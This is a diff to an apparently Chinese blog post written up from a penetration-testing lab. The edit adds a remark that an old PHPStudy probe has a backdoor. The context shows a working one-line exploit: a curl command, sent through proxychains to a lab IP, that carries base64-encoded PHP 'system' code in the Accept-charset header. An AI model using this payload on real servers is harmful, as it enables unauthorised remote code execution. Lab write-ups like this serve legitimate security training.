@@ -315,7 +315,9 @@
 <p>使用数据库服务器的管理员账号密码碰撞成功。</p>
 <p><img src="/2023/06/01/cc123/image-20240103180138926.png" alt="image-20240103180138926"></p>
 <p><img src="/2023/06/01/cc123/image-20240103180146751.png" alt="image-20240103180146751"></p>
-<h2 id="方法二：PHPStudy后门"><a href="#方法二：PHPStudy后门" class="headerlink" title="方法二：PHPStudy后门"></a>方法二：PHPStudy后门</h2><p>请求头中<code>Accept-charset</code>中将php代码base64编码后发送</p>
+<h2 id="方法二：PHPStudy后门"><a href="#方法二：PHPStudy后门" class="headerlink" title="方法二：PHPStudy后门"></a>方法二：PHPStudy后门</h2><p>80端口存在PHPStudy探针，老版本存在后门：</p>
+<p><img src="/2023/06/01/cc123/image-20240103184750219.png" alt="image-20240103184750219"></p>
+<p>请求头中<code>Accept-charset</code>中将php代码base64编码后发送</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -H <span class="string">&quot;Accept-charset: c3lzdGVtKCd3aG9hbWknKTs=&quot;</span> -H <span class="string">&quot;Accept-Encoding: gzip,deflate&quot;</span> http://10.10.12.128/ | grep <span class="string">&quot;sys&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2023/06/01/cc123/image-20240103180209029.png" alt="image-20240103180209029"></p>
